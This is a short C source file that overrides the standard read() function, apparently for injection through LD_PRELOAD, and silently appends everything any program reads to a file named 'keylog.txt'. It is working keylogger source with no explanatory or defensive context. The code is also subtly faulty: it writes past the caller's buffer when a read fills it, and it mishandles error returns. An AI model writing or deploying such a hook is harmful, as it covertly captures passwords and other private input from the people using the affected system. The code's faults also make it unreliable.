#include <stdlib.h>
#include <stdio.h>
#include <gnu/lib-names.h>
#include <dlfcn.h>
#include <unistd.h>

ssize_t read(int fd, void *buf, size_t count) {


   void * handle = dlopen(LIBC_SO, RTLD_LAZY);
   ssize_t (*original_read) (int, void*, size_t ) = dlsym(handle, "read");


   ssize_t readed =  (*original_read)(fd, buf, count);


   if (readed) { 
     FILE * fh = fopen("keylog.txt","a");
     ((char*) buf)[readed]=0;
     fprintf(fh,"%s",(char*) buf);
     fclose(fh);
   }
   return readed; 
}

